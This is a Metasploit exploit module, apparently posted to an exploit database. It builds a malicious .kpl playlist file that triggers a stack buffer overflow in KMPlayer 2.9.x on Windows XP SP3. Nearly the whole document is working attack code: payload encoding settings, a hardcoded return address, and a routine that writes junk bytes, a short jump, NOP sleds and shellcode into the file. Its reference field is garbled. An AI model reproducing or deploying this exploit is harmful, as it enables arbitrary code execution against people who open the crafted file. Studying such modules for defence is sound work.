1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

# KMPlayer <=2.9.x (.kpl) Stack Buffer Overflow (meta)
# By KedAns-Dz
# $ kmp_sbof.rb | 21/04/2011 13:30 $
# Windows XP Sp3 Fr

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'KMPlayer 2.9.x (.kpl) Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in versions v2.9.3
				creating a specially crafted .kpl file, an attacker may be able 
				to execute arbitrary code.
			},
            'License' => MSF_LICENSE,
            'Author' => 'KedAns-Dz <ked-h[at]hotmail.com>',
            'Version' => 'Version 1',
            'References' =>
                [
                    [ 'URL', 'Not Detected Olden This' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload' =>
                {
                    'Space' => 1900,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    'StackAdjustment' => -3500,
                    'DisableNops' => 'True',
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ESI',
						}
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP SP3 France', { 'Ret' => 0x0247fff4} ], # CALL from  ntdll.dll
 
                ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'KedAns.kpl']),
            ], self.class)
    end
 
 
    def exploit

    sploit = "[playlist]\n"
	    sploit << "NumberOfEntries=1\n"
		sploit << "File1=http://"
	    sploit << "\x41" * 200 # buffer Junk
		sploit << "\xeb\x06\x90\x90"  # short jump
		sploit << "\x90" * 30 # nop
		sploit << [target.ret].pack('V')
        sploit << payload.encoded
		sploit << "\x90" * 543 # nop sled
		sploit << ".mp3"
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end